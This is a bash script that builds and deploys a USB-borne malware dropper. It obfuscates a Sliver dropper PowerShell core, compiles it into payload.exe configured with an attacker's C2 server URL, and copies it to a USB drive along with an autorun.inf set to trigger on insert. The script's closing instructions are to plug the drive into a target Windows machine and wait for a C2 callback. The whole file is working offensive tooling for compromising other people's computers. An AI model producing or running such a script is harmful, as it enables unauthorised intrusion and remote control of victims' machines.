#!/bin/bash
# All-in-One: Build + Obfuscate + Compile + Deploy to USB
# Usage: ./build-and-deploy.sh /Volumes/USB_NAME http://your-c2-server:8080

set -e

if [ $# -lt 2 ]; then
	echo "Usage: $0 <USB_PATH> <C2_URL>"
	echo "Example: $0 /Volumes/USBA http://192.168.1.100:8080"
	exit 1
fi

USB_PATH="$1"
C2_URL="$2"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BUILD_DIR="/tmp/usb-build-$$"
DROPPER_CORE="$SCRIPT_DIR/lib/sliver-dropper-core.ps1"

echo "[*] USB Build & Deploy"
echo "    USB: $USB_PATH"
echo "    C2: $C2_URL"
echo "    Build: $BUILD_DIR"

# Validate USB
if [ ! -d "$USB_PATH" ]; then
	echo "[-] USB not found: $USB_PATH"
	exit 1
fi

# Create build dir
mkdir -p "$BUILD_DIR"
cd "$BUILD_DIR"

# Step 1: Copy dropper core
echo "[1/5] Copying dropper core..."
cp "$DROPPER_CORE" dropper-core.ps1

# Step 2: Obfuscate
echo "[2/5] Obfuscating..."
powershell -NoProfile -NoExit -Command ". '$SCRIPT_DIR/lib/obfuscation.ps1'; Obfuscate-PowerShellScript -ScriptPath 'dropper-core.ps1' -OutputPath 'dropper-obfuscated.ps1'" 2>/dev/null || true

if [ ! -f dropper-obfuscated.ps1 ]; then
	echo "[!] Obfuscation failed, using original"
	cp dropper-core.ps1 dropper-obfuscated.ps1
fi

# Step 3: Compile to .exe
echo "[3/5] Compiling to .exe..."
python3 "$SCRIPT_DIR/lib/ps2exe-wrapper.py" dropper-obfuscated.ps1 \
	-o payload.exe \
	--c2-url "$C2_URL" \
	--obfuscate 2>/dev/null || true

if [ ! -f payload.exe ]; then
	echo "[-] Compilation failed"
	exit 1
fi

# Step 4: Verify .exe
EXE_SIZE=$(stat -f%z payload.exe 2>/dev/null || stat -c%s payload.exe 2>/dev/null)
echo "[4/5] Compiled: payload.exe ($((EXE_SIZE / 1024)) KB)"

# Step 5: Deploy to USB
echo "[5/5] Deploying to USB..."
cp payload.exe "$USB_PATH/"
cp "$SCRIPT_DIR/usb-autorun.inf" "$USB_PATH/autorun.inf"

# Verify
ls -lh "$USB_PATH/payload.exe" "$USB_PATH/autorun.inf"

echo "[+] Deployment complete!"
echo ""
echo "USB ready:"
echo "  - payload.exe (compiled dropper)"
echo "  - autorun.inf (trigger on insert)"
echo ""
echo "Next steps:"
echo "  1. Eject USB safely"
echo "  2. Insert on target Windows machine"
echo "  3. Monitor C2 for callback"
echo ""
echo "C2 listening on: $C2_URL"

# Cleanup
cd /
rm -rf "$BUILD_DIR"
